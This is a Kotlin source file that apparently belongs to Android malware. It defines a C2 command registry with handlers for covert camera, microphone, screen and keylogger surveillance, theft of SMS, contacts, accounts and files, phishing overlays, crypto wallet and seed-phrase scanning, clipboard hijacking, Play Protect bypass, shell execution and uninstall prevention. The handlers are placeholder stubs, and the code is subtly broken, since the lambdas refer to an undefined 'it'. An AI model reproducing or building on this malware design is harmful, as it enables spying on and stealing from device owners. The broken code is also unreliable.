package com.xrc.app.model

import org.json.JSONArray
import org.json.JSONObject

/**
 * Command definitions and registry for C2 communication.
 * Maps command type strings to handler implementations.
 */
object Commands {

    private val commandRegistry = mutableMapOf<CommandType, CommandHandler>()

    /** Register a handler for a command type */
    fun register(type: CommandType, handler: CommandHandler) {
        commandRegistry[type] = handler
    }

    /** Get handler for a command type */
    fun getHandler(type: CommandType): CommandHandler? {
        return commandRegistry[type]
    }

    /** Check if a command type has a registered handler */
    fun hasHandler(type: CommandType): Boolean {
        return commandRegistry.containsKey(type)
    }

    /** Get all registered command types */
    fun getRegisteredCommands(): Set<CommandType> {
        return commandRegistry.keys
    }

    /** Number of registered command handlers */
    val registeredCount: Int get() = commandRegistry.size

    /** Initialize all default command handlers */
    fun initializeDefaults() {
        registerSystemCommands()
        registerSurveillanceCommands()
        registerExfiltrationCommands()
        registerOverlayCommands()
        registerFinanceCommands()
        registerEscalationCommands()
        registerPermissionCommands()
        registerPersistenceCommands()
    }

    private fun registerSystemCommands() {
        register(CommandType.PING) { _, _ ->
            CommandResponse(it.id, true, mapOf("pong" to System.currentTimeMillis().toString()))
        }
        register(CommandType.HEARTBEAT) { _, _ ->
            CommandResponse(it.id, true, mapOf("status" to "alive"))
        }
        register(CommandType.GET_DEVICE_INFO) { _, deviceInfo ->
            CommandResponse(it.id, true, mapOf("deviceInfo" to deviceInfo.toJson().toString()))
        }
        register(CommandType.GET_BATTERY_INFO) { _, _ ->
            CommandResponse(it.id, true, mapOf("battery" to "check"))
        }
        register(CommandType.GET_NETWORK_INFO) { _, _ ->
            CommandResponse(it.id, true, mapOf("network" to "check"))
        }
    }

    private fun registerSurveillanceCommands() {
        register(CommandType.START_CAMERA) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "starting camera"))
        }
        register(CommandType.STOP_CAMERA) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "stopping camera"))
        }
        register(CommandType.START_MIC) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "starting microphone"))
        }
        register(CommandType.STOP_MIC) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "stopping microphone"))
        }
        register(CommandType.START_SCREEN_CAPTURE) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "starting screen capture"))
        }
        register(CommandType.STOP_SCREEN_CAPTURE) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "stopping screen capture"))
        }
        register(CommandType.START_KEYLOGGER) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "starting keylogger"))
        }
        register(CommandType.STOP_KEYLOGGER) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "stopping keylogger"))
        }
        register(CommandType.START_LOCATION) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "starting location tracking"))
        }
        register(CommandType.STOP_LOCATION) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "stopping location tracking"))
        }
    }

    private fun registerExfiltrationCommands() {
        register(CommandType.GET_CONTACTS) { _, _ ->
            CommandResponse(it.id, true, mapOf("type" to "contacts"))
        }
        register(CommandType.GET_SMS) { _, _ ->
            CommandResponse(it.id, true, mapOf("type" to "sms"))
        }
        register(CommandType.GET_CALL_LOGS) { _, _ ->
            CommandResponse(it.id, true, mapOf("type" to "call_logs"))
        }
        register(CommandType.GET_FILES) { _, _ ->
            CommandResponse(it.id, true, mapOf("type" to "files"))
        }
        register(CommandType.GET_NOTIFICATIONS) { _, _ ->
            CommandResponse(it.id, true, mapOf("type" to "notifications"))
        }
        register(CommandType.GET_CLIPBOARD) { _, _ ->
            CommandResponse(it.id, true, mapOf("type" to "clipboard"))
        }
        register(CommandType.GET_ACCOUNTS) { _, _ ->
            CommandResponse(it.id, true, mapOf("type" to "accounts"))
        }
        register(CommandType.GET_WIFI_INFO) { _, _ ->
            CommandResponse(it.id, true, mapOf("type" to "wifi"))
        }
        register(CommandType.GET_INSTALLED_APPS) { _, _ ->
            CommandResponse(it.id, true, mapOf("type" to "installed_apps"))
        }
    }

    private fun registerOverlayCommands() {
        register(CommandType.SHOW_OVERLAY) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "showing overlay"))
        }
        register(CommandType.HIDE_OVERLAY) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "hiding overlay"))
        }
        register(CommandType.SHOW_PHISHING_PAGE) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "showing phishing page"))
        }
        register(CommandType.SHOW_FAKE_DIALOG) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "showing fake dialog"))
        }
        register(CommandType.TRIGGER_OVERLAY_FOR_APP) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "triggering overlay for app"))
        }
    }

    private fun registerFinanceCommands() {
        register(CommandType.START_FINANCE_MONITORING) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "starting finance monitoring"))
        }
        register(CommandType.STOP_FINANCE_MONITORING) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "stopping finance monitoring"))
        }
        register(CommandType.SCAN_WALLETS) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "scanning wallets"))
        }
        register(CommandType.SCAN_SEED_PHRASES) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "scanning seed phrases"))
        }
        register(CommandType.HIJACK_CLIPBOARD) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "activating clipboard hijack"))
        }
        register(CommandType.STOP_CLIPBOARD_HIJACK) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "deactivating clipboard hijack"))
        }
        register(CommandType.GET_WALLET_BALANCE) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "getting wallet balance"))
        }
        register(CommandType.GET_TRANSACTIONS) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "getting transactions"))
        }
    }

    private fun registerEscalationCommands() {
        register(CommandType.ESCALATE_ADB) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "escalating ADB"))
        }
        register(CommandType.ESCALATE_SHIZUKU) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "escalating Shizuku"))
        }
        register(CommandType.SHELL_COMMAND) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "executing shell command"))
        }
    }

    private fun registerPermissionCommands() {
        register(CommandType.GRANT_PERMISSIONS) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "granting permissions"))
        }
        register(CommandType.BYPASS_PLAY_PROTECT) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "bypassing play protect"))
        }
        register(CommandType.BYPASS_RESTRICTED_SETTINGS) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "bypassing restricted settings"))
        }
    }

    private fun registerPersistenceCommands() {
        register(CommandType.ENABLE_ADMIN) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "enabling admin"))
        }
        register(CommandType.DISABLE_ADMIN) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "disabling admin"))
        }
        register(CommandType.PREVENT_UNINSTALL) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "preventing uninstall"))
        }
        register(CommandType.INSTALL_SYSTEM_APP) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "installing as system app"))
        }
        register(CommandType.RECONNECT) { _, _ ->
            CommandResponse(it.id, true, mapOf("action" to "reconnecting"))
        }
    }
}

/** Interface for command handlers */
typealias CommandHandler = (command: Command, deviceInfo: Any?) -> CommandResponse
